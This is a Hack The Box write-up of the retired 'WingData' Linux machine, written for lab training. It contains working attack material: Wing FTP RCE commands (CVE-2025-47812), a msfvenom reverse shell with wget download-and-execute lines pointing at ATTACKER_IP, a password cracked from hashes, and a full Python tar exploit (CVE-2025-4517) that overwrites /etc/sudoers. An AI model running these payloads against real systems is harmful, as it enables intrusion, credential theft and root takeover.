# HTB WingData — Full Writeup

**Platform:** Hack The Box
**Difficulty:** Easy
**OS:** Linux
**Season:** Season 10
**Status:** Retired
**CVEs:** CVE-2025-47812 · CVE-2025-4517

---

## Overview

WingData is an easy Linux machine hosting a file-sharing company website backed by Wing FTP Server. The attack chain starts with unauthenticated remote code execution via null byte injection in the FTP web client's login handler, then pivots through password hash cracking to reach a local user account. Root is obtained by exploiting a PATH_MAX exhaustion bug in Python's tarfile `data` filter to escape a restricted extraction directory and overwrite `/etc/sudoers`.

**Full chain:**
```
Wing FTP RCE via null byte injection (wingftp)
  → Password hash extraction + cracking (wacky)
    → tarfile data filter PATH_MAX bypass via sudo script (root)
```

---

## Reconnaissance

### Port Scan

```bash
sudo nmap -sC -sV -oN wingdata_nmap.txt 10.129.12.23
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 9.2p1 Debian |
| 80 | HTTP | Apache 2.4.66 |

Port 80 redirects to `wingdata.htb`. Add to `/etc/hosts`:

```bash
echo "10.129.12.23 wingdata.htb ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

### Web Enumeration

- `wingdata.htb` — Static marketing site for "Wing Data Solutions" (Bootstrap template). The nav bar links to a "Client Portal" at `ftp.wingdata.htb`.
- `ftp.wingdata.htb` — **Wing FTP Server (Free Edition)** web client with a login form. Response headers confirm the product and version.

```bash
curl -sI http://ftp.wingdata.htb/ | grep Server
# Server: Wing FTP Server(Free Edition)
```

The FTP web client accepts anonymous login (`anonymous` / `anonymous`), but the account has no upload permissions and the FTP directory is empty.

### Internal Services

The Wing FTP admin panel listens on `127.0.0.1:5466` (accessible only from the target).

---

## Step 1 — Foothold via Wing FTP RCE (CVE-2025-47812)

### Vulnerability

Wing FTP Server versions ≤ 7.4.3 are vulnerable to unauthenticated remote code execution. The flaw arises from a discrepancy between `c_CheckUser()` (which truncates the username at a NULL byte) and the session creation logic (which uses the full unsanitized username). A NULL byte followed by Lua code injected into the `username` parameter during login is written into a session file. When the session file is subsequently loaded (e.g., by accessing `/dir.html`), the injected Lua code executes via `io.popen()`.

### Exploit

A public exploit is available via `searchsploit`:

```bash
searchsploit "wing ftp"
cp /usr/share/exploitdb/exploits/multiple/remote/52347.py ~/wingftp_rce.py
```

Verify RCE:

```bash
python3 ~/wingftp_rce.py -u http://ftp.wingdata.htb -c "whoami" -v
# → wingftp
```

### Reverse Shell via Meterpreter

Generate a payload:

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=9001 -f elf -o ~/shell.elf
```

Start a handler:

```bash
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 9001; run"
```

Serve the payload and deliver it via three RCE calls:

```bash
# Terminal 1: serve the payload
cd ~ && python3 -m http.server 8080

# Terminal 2: download, chmod, execute (run quickly in sequence)
python3 ~/wingftp_rce.py -u http://ftp.wingdata.htb -c "wget http://ATTACKER_IP:8080/shell.elf -O /tmp/shell.elf" -v
python3 ~/wingftp_rce.py -u http://ftp.wingdata.htb -c "chmod 777 /tmp/shell.elf" -v
python3 ~/wingftp_rce.py -u http://ftp.wingdata.htb -c "/tmp/shell.elf" -v
```

A Meterpreter session opens as `wingftp` (uid 1000).

> **Note:** The exploit burns through anonymous sessions quickly. If you get "UID not found in Set-Cookie" errors, the server may have rate-limited the account. Reset the box and execute the download → chmod → execute sequence without delay.

---

## Step 2 — Lateral Movement via Password Hash Cracking

### Hash Extraction

Wing FTP stores user configuration (including password hashes) in XML files readable by the `wingftp` user:

```bash
# From the Meterpreter shell
find /opt/wftpserver/Data/1/users/ -name "*.xml"
cat /opt/wftpserver/Data/1/users/wacky.xml | grep Password
```

Extracted hashes:

| User | Hash |
|------|------|
| wacky | `32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca` |
| admin | `a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba` |
| maria | `a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03` |
| steve | `5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca` |
| john | `c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10` |

### Identifying the Hash Scheme

The domain settings reveal the hashing configuration:

```bash
cat /opt/wftpserver/Data/1/settings.xml | grep -E "Salt|SHA"
```

```xml
<EnablePasswordSalting>1</EnablePasswordSalting>
<SaltingString>WingFTP</SaltingString>
<EnableSHA256>1</EnableSHA256>
```

The Lua source at `/opt/wftpserver/lua/ServerInterface.lua` confirms the formula: `SHA256(password + "WingFTP")`.

### Cracking

```bash
echo '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP' > ~/hashes_salted.txt
echo 'a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba:WingFTP' >> ~/hashes_salted.txt
echo 'a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03:WingFTP' >> ~/hashes_salted.txt
echo '5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca:WingFTP' >> ~/hashes_salted.txt
echo 'c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10:WingFTP' >> ~/hashes_salted.txt

hashcat -m 1410 ~/hashes_salted.txt /usr/share/wordlists/rockyou.txt
```

Result:

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
```

**Credentials:** `wacky` / `!#7Blushing^*Bride5`

### SSH Access

```bash
ssh wacky@10.129.12.23
cat ~/user.txt
```

---

## Step 3 — Privilege Escalation via tarfile Data Filter Bypass (CVE-2025-4517)

### Enumeration as wacky

```bash
sudo -l
```

```
(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

The script extracts a tar archive as root into a staging directory, using Python's `tarfile.extractall()` with `filter="data"`:

```python
with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
```

The `data` filter was introduced in Python 3.12 to prevent path traversal, symlink escape, and ownership abuse during tar extraction. It validates that all member paths and link targets resolve within the destination directory using `os.path.realpath()`.

The target runs **Python 3.12.3**:

```bash
/usr/local/bin/python3 --version
# Python 3.12.3
```

### Vulnerability

CVE-2025-4517 bypasses the `data` filter by exploiting a PATH_MAX limitation. The `os.path.realpath()` function relies on the kernel's path resolution, which enforces a PATH_MAX limit (4096 bytes on Linux). By constructing deeply nested directories with long names and symlinks that exceed this limit, `realpath()` fails to properly resolve the path and returns an incorrect result. The `commonpath` check then incorrectly passes, allowing files to be written outside the intended staging directory.

### Exploit

The attack creates a malicious tar archive with:
1. Deeply nested directories (247-char names) with symlinks at each level to build a path exceeding PATH_MAX
2. An "escape" symlink that traverses out of the staging directory to `/etc`
3. A hardlink to `/etc/sudoers` followed by a regular file that overwrites it with a permissive sudoers entry

```python
import tarfile, os, io

comp = 'd' * 247
steps = "abcdefghijklmnop"
path = ""

with tarfile.open("/tmp/backup_9999.tar", mode="w") as tar:
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)

    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = "../" * len(steps)
    tar.addfile(l)

    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../../../../etc"
    tar.addfile(e)

    f = tarfile.TarInfo("sudoers_link")
    f.type = tarfile.LNKTYPE
    f.linkname = "escape/sudoers"
    tar.addfile(f)

    content = b"wacky ALL=(ALL) NOPASSWD: ALL\n"
    c = tarfile.TarInfo("sudoers_link")
    c.type = tarfile.REGTYPE
    c.size = len(content)
    tar.addfile(c, fileobj=io.BytesIO(content))
```

Save and execute:

```bash
python3 /tmp/exploit.py
cp /tmp/backup_9999.tar /opt/backup_clients/backups/
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_evil
```

Verify and escalate:

```bash
sudo cat /root/root.txt
```

---

## Flags

| Flag | Location |
|------|----------|
| user.txt | `/home/wacky/user.txt` |
| root.txt | `/root/root.txt` |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service enumeration |
| searchsploit | Finding the Wing FTP RCE exploit (CVE-2025-47812) |
| msfvenom | Generating Meterpreter ELF payload |
| msfconsole | Reverse shell handler |
| python3 -m http.server | Serving the payload to the target |
| hashcat | Cracking salted SHA-256 password hashes |
| Python tarfile | Crafting malicious tar archive for CVE-2025-4517 |

---

## Key Takeaways

**Anonymous access is still access** — The anonymous FTP account had no upload permissions and an empty directory, but it was sufficient to trigger CVE-2025-47812. The null byte injection targets the authentication handler itself, not the authenticated session. Any valid login — including anonymous — is enough.

**Application config files are treasure** — Wing FTP stores password hashes, salting configuration, and admin credentials in plaintext XML files accessible to the service user. Gaining shell access as the service account often means full access to every user's credentials.

**Security filters have platform-dependent limits** — Python's `tarfile` `data` filter is logically correct: it validates every path and link target against the destination directory. But it delegates resolution to `os.path.realpath()`, which inherits the kernel's PATH_MAX constraint. When the path exceeds 4096 bytes, resolution fails silently, and the filter's safety guarantee breaks. Defense-in-depth should not assume that one validation layer is infallible.

**Rate limiting matters for exploit reliability** — The Wing FTP RCE burns session tokens on every attempt. Executing the download → chmod → execute chain quickly in sequence is critical. Delays between steps risk account lockout, requiring a box reset.
